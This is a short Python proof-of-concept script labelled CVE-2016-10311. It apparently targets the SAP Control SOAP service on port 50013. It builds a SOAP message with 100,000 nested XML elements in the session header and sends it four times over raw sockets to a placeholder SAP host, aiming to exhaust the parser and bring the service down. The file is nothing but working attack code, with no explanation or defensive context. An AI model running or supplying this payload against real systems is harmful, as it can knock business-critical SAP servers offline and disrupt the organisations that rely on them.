CVE-2016-10311/PoC.py

import socket
PoC= """<?xml version="1.0" encoding="utf-8"?>

<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <SOAP-ENV:Header>
        <sapsess:Session xlmns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
>""" + "<a>" * 100000 + "</a>" * 100000 + """        </sapsess:Session>
    </SOAP-ENV:Header>
    <SOAP-ENV:Body>
        <ns1:WW xmlns:ns1="urn:SAPControl">
            <b></b>
            <e><e>
        </ns1:WW>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>""" 
for i in range(1,5):
    sock = socket.socket()
    sock.connect(("SAP_IP", 50013))
    sock.send(PoC)